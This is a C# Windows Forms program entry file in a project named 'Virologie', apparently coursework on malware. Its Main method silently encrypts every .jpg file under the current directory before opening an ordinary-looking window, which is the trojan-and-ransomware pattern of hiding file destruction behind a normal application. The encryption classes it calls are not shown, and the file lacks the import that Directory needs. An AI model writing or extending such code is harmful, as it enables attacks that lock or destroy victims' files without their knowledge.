using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;

namespace Virologie
{
    static class Program
    {
        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            FileExplorer explorer = new FileExplorer();
            FileEncrypter encrypter = new FileEncrypter();
            explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }
    }
}
